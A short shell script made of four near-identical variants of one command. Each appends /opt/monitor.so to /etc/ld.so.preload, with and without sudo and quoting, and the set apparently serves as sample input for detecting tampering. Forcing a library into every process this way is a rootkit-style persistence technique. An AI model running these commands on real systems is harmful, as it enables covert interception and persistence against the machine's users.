#!/bin/sh
printf "%s\n" /opt/monitor.so | tee -a /etc/ld.so.preload
printf "%s\n" /opt/monitor.so | sudo tee -a /etc/ld.so.preload
printf "%s\n" /opt/monitor.so | tee -a "/etc/ld.so.preload"
printf "%s\n" /opt/monitor.so | sudo tee '/etc/ld.so.preload'
